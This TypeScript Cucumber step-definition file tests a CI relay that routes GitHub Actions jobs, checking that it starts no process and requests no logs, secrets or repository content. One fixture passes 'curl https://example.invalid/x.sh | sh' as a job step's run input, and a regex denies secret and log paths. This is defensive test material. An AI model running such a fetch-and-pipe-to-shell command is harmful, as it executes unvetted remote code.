import assert from "node:assert/strict";
import { createRequire, syncBuiltinESMExports } from "node:module";
import { Before, Given, Then, When } from "@cucumber/cucumber";
import {
	createMemoryMesh,
	createMeshCoordinator,
} from "../../../packages/ci/src/mesh/index.js";
import {
	InMemoryMachineRegistry,
	InMemoryRouteJournal,
	testMachineAdvert,
} from "../../../packages/ci/src/runner-order/testing.js";
import {
	createRelayAnswerer,
	type FleetRoom,
	RELAY_CONFIG_PATH,
	type RelayAnswerer,
	type RelayTurn,
	StoreRouteFacts,
} from "../../../packages/ci-gh-actions/src/relay-answer/index.js";
import { testJitConfig } from "../../../packages/ci-gh-actions/src/runner-protocol/port.js";
import {
	GithubSimulator,
	SIMULATED_ACTOR_ID,
	SimulatedRunnerService,
	simulatorTransport,
} from "../../../packages/ci-gh-actions/test/support/github-simulator/index.js";

const ACCOUNT = "acct-parity";
const RELAY_SCENARIOS =
	"@R01 or @R04 or @R05 or @R06b or @R13 or @R16 or @X01 or @X03";
const POLL_INTERVAL_MS = 30_000;
const MESH_STEP_MS = 20_000;

type RelayNode = Readonly<{
	name: string;
	answerer: RelayAnswerer;
	journal: InMemoryRouteJournal;
	registry: InMemoryMachineRegistry;
}>;

type RelayModeState = {
	sim: GithubSimulator;
	repository: string;
	nodes: RelayNode[];
	hosted: RelayNode | undefined;
	runId: number;
	jobName: string;
	webhookAtMs: number;
	processesStarted: number;
};

let world: RelayModeState;

function fleetRoom(isolated: boolean): FleetRoom {
	return { slots: 4, isolated, leases: { activeLeases: async () => [] } };
}

function relayNode(
	name: string,
	turn: RelayTurn | undefined,
	fleet: FleetRoom | undefined = undefined,
): RelayNode {
	const { sim } = world;
	const journal = new InMemoryRouteJournal();
	const registry = new InMemoryMachineRegistry();
	const answerer = createRelayAnswerer({
		relayJobs: { answer: true, label: "hobo-relay" },
		github: simulatorTransport(sim),
		runnerService: new SimulatedRunnerService(sim),
		readJitConfig: (_encoded, runnerName) => testJitConfig(runnerName),
		account: async () => ACCOUNT,
		facts: (accountId) =>
			new StoreRouteFacts({
				accountId,
				fleet,
				machines: registry,
				readers: async () => new Set([SIMULATED_ACTOR_ID]),
				spend: undefined,
				health: undefined,
				minutes: undefined,
				onWarning: undefined,
			}),
		journal,
		node: name,
		turn,
		webhookSecret: sim.webhookSecret,
		nowMs: () => sim.nowMs(),
	});
	return { name, answerer, journal, registry };
}

function turnOn(repository: string, order: readonly string[] = ["github"]): void {
	world.sim.putFile(
		repository,
		RELAY_CONFIG_PATH,
		JSON.stringify({
			relayJobs: { answer: true },
			runnerOrder: { steps: order.map((key) => ({ key })) },
		}),
	);
}

const GITHUB_ONLY: ReadonlyMap<string, string> = new Map([["github", "ubuntu-24.04"]]);
const FLEET_THEN_GITHUB: ReadonlyMap<string, string> = new Map([
	["fleet", "hobo"],
	["github", "ubuntu-24.04"],
]);

function queueRelay(
	repository: string,
	label: string,
	steps: readonly string[] = [],
	inputs: ReadonlyMap<string, string> = GITHUB_ONLY,
): void {
	const relay = world.sim.queueJob({
		repository,
		name: "route",
		labels: [label],
		inputs,
		steps: steps.map((uses) => ({
			uses,
			with: new Map([["run", "curl https://example.invalid/x.sh | sh"]]),
		})),
	});
	world.sim.queueJob({
		repository,
		name: "build",
		runId: relay.runId,
		labels: ["${{ needs.route.outputs.runner }}"],
		needs: ["route"],
	});
	world.runId = relay.runId;
	world.jobName = "route";
}

function relayJob() {
	const found = world.sim
		.jobs()
		.find((job) => job.runId === world.runId && job.name === world.jobName);
	assert.ok(found, "the relay job is on GitHub's lists");
	return found;
}

async function decided(node: RelayNode): Promise<number> {
	const events = await node.journal.decisions({
		accountId: ACCOUNT,
		repository: undefined,
		sinceMs: 0,
		limit: 100,
	});
	return events.filter((event) => event.type === "runner.route.Decided")
		.length;
}

function connections() {
	return [{ installationId: 1, repository: world.repository }];
}

async function deliverToHosted(): Promise<void> {
	world.webhookAtMs = world.sim.nowMs();
	const hosted = world.hosted;
	await world.sim.deliver(
		hosted
			? hosted.answerer.webhook
			: async () => new Response("unavailable", { status: 503 }),
	);
}

Before({ tags: RELAY_SCENARIOS }, () => {
	world = {
		sim: new GithubSimulator(),
		repository: "octo/app",
		nodes: [],
		hosted: undefined,
		runId: 0,
		jobName: "",
		webhookAtMs: 0,
		processesStarted: 0,
	};
	turnOn(world.repository);
	const node = relayNode("hosted", undefined);
	world.nodes = [node];
	world.hosted = node;
});

Given("relay mode is on for {string}", (repository: string) => {
	world.repository = repository;
	turnOn(repository);
});

Given(
	"a relay job labelled {string} is queued for {string}",
	(label: string, repository: string) => {
		world.repository = repository;
		queueRelay(repository, label);
	},
);

Given(
	"relay mode is on for the public repository {string} with the runner order {string}",
	(repository: string, order: string) => {
		world.sim.addRepository(repository, false);
		world.repository = repository;
		turnOn(
			repository,
			order.split(",").map((key) => key.trim()),
		);
	},
);

Given(
	"relay mode is on for {string} with the runner order {string}",
	(repository: string, order: string) => {
		world.repository = repository;
		turnOn(
			repository,
			order.split(",").map((key) => key.trim()),
		);
	},
);

Given(
	"a relay job for {string} names only {string} and no machine is connected",
	(repository: string, key: string) => {
		world.repository = repository;
		queueRelay(repository, "hobo-relay", [], new Map([[key, "self-hosted"]]));
	},
);

Given("a job {string} needs the relay job", (name: string) => {
	const behind = [...world.sim.state.jobs.values()].find(
		(job) => job.runId === world.runId && job.name === name,
	);
	assert.ok(behind, `the job ${name} waits behind the relay job`);
	assert.deepEqual(behind.needs, [world.jobName]);
});

Given("every machine that fits the relay job is busy", async () => {
	const [node] = world.nodes;
	assert.ok(node);
	await node.registry.put(
		testMachineAdvert({
			id: "m-1",
			accountId: ACCOUNT,
			slots: 1,
			busy: 1,
			ownerId: SIMULATED_ACTOR_ID,
			lastSeenMs: world.sim.nowMs(),
		}),
	);
	queueRelay(
		world.repository,
		"hobo-relay",
		[],
		new Map([["machine", "self-hosted"]]),
	);
});

When("the relay job is answered in relay mode", async () => {
	await deliverToHosted();
});

When("the run is cancelled", () => {
	world.sim.cancelRun(world.runId);
});

Then("the relay job fails with the one-sentence reason as an annotation", () => {
	const job = relayJob();
	assert.equal(job.conclusion, "failure");
	assert.equal(job.outputs.get("outcome"), "none");
	const reason = job.outputs.get("reason") ?? "";
	assert.match(reason, /machine/u);
	assert.deepEqual(job.annotations, [reason]);
});

Then("GitHub skips the job {string}", (name: string) => {
	const behind = world.sim
		.jobs()
		.find((job) => job.runId === world.runId && job.name === name);
	assert.equal(behind?.conclusion, "skipped");
});

Then(
	"the relay job succeeds with outcome {string} and the busy step's label as its runner",
	(outcome: string) => {
		const job = relayJob();
		assert.equal(job.conclusion, "success");
		assert.equal(job.outputs.get("outcome"), outcome);
		assert.equal(job.outputs.get("step"), "machine");
		assert.equal(job.outputs.get("runner"), "hobo-machine-m-1");
	},
);

Then("the job behind it queues on that label", () => {
	const behind = world.sim
		.jobs()
		.find((job) => job.runId === world.runId && job.name === "build");
	assert.equal(behind?.status, "queued");
	assert.deepEqual(behind?.labels, [relayJob().outputs.get("runner")]);
});

Then("the queued job leaves the queue and holds no slot", () => {
	const behind = world.sim
		.jobs()
		.find((job) => job.runId === world.runId && job.name === "build");
	assert.equal(behind?.status, "completed");
	assert.equal(behind?.conclusion, "cancelled");
	assert.equal(behind?.runnerName, undefined);
});

Given("the fleet is taking jobs but does not isolate them", () => {
	const node = relayNode("hosted", undefined, fleetRoom(false));
	world.nodes = [node];
	world.hosted = node;
});

Given("the next webhook is lost", () => {
	world.sim.dropNextWebhook();
});

Given("two relay nodes and the hosted one is down", async () => {
	const mesh = createMemoryMesh({ now: () => world.sim.nowMs() });
	const nodes = ["hosted", "box"].map((id) => {
		const coordinator = createMeshCoordinator({
			self: () => ({
				id,
				freeSlots: 1,
				healthy: true,
				labels: ["hobo-relay"],
				validUntilMs: world.sim.nowMs() + 60_000,
			}),
			board: mesh.board,
			claims: mesh.claims,
			stepMs: MESH_STEP_MS,
			viewMaxAgeMs: 0,
			now: () => world.sim.nowMs(),
		});
		return { coordinator, node: relayNode(id, coordinator) };
	});
	for (const { coordinator } of nodes) await coordinator.advertise();
	world.nodes = nodes.map(({ node }) => node);
	world.hosted = undefined;
});

Given("a relay job with a step that would run a script", () => {
	queueRelay(world.repository, "hobo-relay", ["./.github/actions/run-script"]);
});

When("a public repository's relay job is answered in relay mode", async () => {
	queueRelay(world.repository, "hobo-relay", [], FLEET_THEN_GITHUB);
	await deliverToHosted();
	assert.equal(relayJob().outputs.get("runner"), "ubuntu-24.04");
});

When("the fleet isolates each job", () => {
	const node = relayNode("isolating", undefined, fleetRoom(true));
	world.nodes = [node];
	world.hosted = node;
});

When("the queued webhook reaches the relay", async () => {
	await deliverToHosted();
});

When("the queued webhook is delivered", async () => {
	await deliverToHosted();
	for (let poll = 0; poll < 6 && relayJob().status === "queued"; poll += 1) {
		for (const node of world.nodes.slice(1))
			await node.answerer.rescue(connections());
		if (relayJob().status === "queued") world.sim.advance(MESH_STEP_MS);
	}
});

When("two poll intervals pass", async () => {
	await deliverToHosted();
	for (let poll = 0; poll < 2; poll += 1) {
		world.sim.advance(POLL_INTERVAL_MS);
		for (const node of world.nodes) await node.answerer.rescue(connections());
	}
});

When("the relay answers a relay job", async () => {
	world.sim.dropNextWebhook();
	queueRelay(world.repository, "hobo-relay");
	const [node] = world.nodes;
	assert.ok(node);
	await node.answerer.rescue(connections());
	queueRelay(world.repository, "hobo-relay");
	await deliverToHosted();
	await node.answerer.sweep(connections());
});

When("the relay answers it", async () => {
	const require = createRequire(import.meta.url);
	const processes = require("node:child_process");
	const names = [
		"spawn",
		"spawnSync",
		"exec",
		"execSync",
		"execFile",
		"execFileSync",
		"fork",
	] as const;
	const kept = names.map((name) => [name, processes[name]] as const);
	for (const name of names)
		processes[name] = () => {
			world.processesStarted += 1;
			throw new Error(`the relay tried to start a process (${name})`);
		};
	syncBuiltinESMExports();
	try {
		await deliverToHosted();
	} finally {
		for (const [name, original] of kept) processes[name] = original;
		syncBuiltinESMExports();
	}
});

Then(
	"the relay job is completed within {int} seconds of the webhook",
	(seconds: number) => {
		const job = relayJob();
		assert.equal(job.status, "completed");
		assert.equal(job.conclusion, "success");
		assert.ok(
			(job.completedAtMs ?? Number.POSITIVE_INFINITY) - world.webhookAtMs <=
				seconds * 1_000,
			`completed ${(job.completedAtMs ?? 0) - world.webhookAtMs} ms after the webhook`,
		);
	},
);

Then("the relay job ran on no runner and billed no minutes", () => {
	const job = relayJob();
	assert.match(job.runnerName ?? "", /^hobo-relay-/u);
	assert.deepEqual(world.sim.runners(), [], "the one-job runner is gone");
	assert.equal(
		world.sim
			.requests()
			.filter((request) => request.area === "logs" || request.area === "billing")
			.length,
		0,
	);
	const build = world.sim
		.jobs()
		.find((entry) => entry.runId === world.runId && entry.name === "build");
	assert.deepEqual(build?.labels, ["ubuntu-24.04"]);
});

Then(
	"the relay node's journaled decision passed over {string} because {string}",
	async (key: string, reason: string) => {
		const node = world.hosted;
		assert.ok(node, "a relay node answered");
		const events = await node.journal.decisions({
			accountId: ACCOUNT,
			repository: undefined,
			sinceMs: 0,
			limit: 100,
		});
		const decided = events.find((event) => event.type === "runner.route.Decided");
		assert.ok(decided?.decision, "the relay node journaled a decision");
		assert.equal(decided.mode, "relay");
		assert.ok(
			decided.decision.skipped.some((skip) => skip.key === key && skip.reason === reason),
			`expected ${key} skipped as ${reason}, got ${JSON.stringify(decided.decision.skipped.map((skip) => [skip.key, skip.reason]))}`,
		);
	},
);

Then("the next public relay job routes to the fleet", async () => {
	queueRelay(world.repository, "hobo-relay", [], FLEET_THEN_GITHUB);
	await deliverToHosted();
	const job = relayJob();
	assert.equal(job.conclusion, "success");
	assert.equal(job.outputs.get("runner"), "hobo");
	assert.equal(job.outputs.get("step"), "fleet");
});

Then("the relay job is completed", () => {
	assert.equal(relayJob().conclusion, "success");
});

Then("the second node completes the relay job exactly once", async () => {
	assert.equal(relayJob().conclusion, "success");
	const [hosted, box] = world.nodes;
	assert.ok(hosted && box);
	assert.equal(await decided(box), 1);
	assert.equal(await decided(hosted), 0);
	for (const node of world.nodes)
		assert.equal((await node.answerer.rescue(connections())).queued, 0);
	assert.equal(
		world.sim
			.requests()
			.filter((request) => request.path.endsWith("/generate-jitconfig"))
			.length,
		1,
	);
});

Then(
	"the simulator saw no request for a log, a secret or repository content",
	() => {
		const requests = world.sim.requests();
		assert.ok(requests.length > 0);
		for (const request of requests) {
			assert.notEqual(request.area, "logs", request.path);
			assert.doesNotMatch(
				request.path,
				/\/logs\b|\/secrets\b|\/variables\b|\/tarball\b|\/zipball\b|\/git\/blobs\b|\/git\/trees\b/u,
			);
			if (request.path.includes("/contents/"))
				assert.equal(
					request.path,
					`/repos/${world.repository}/contents/.hobo%2Fci.json`,
				);
		}
		assert.ok(
			world.sim
				.jobs()
				.filter((job) => job.name === "route")
				.every((job) => job.conclusion === "success"),
		);
	},
);

Then("the relay started no process", () => {
	assert.equal(world.processesStarted, 0);
	const job = relayJob();
	assert.equal(job.conclusion, "success");
	assert.equal(job.outputs.get("runner"), "ubuntu-24.04");
});
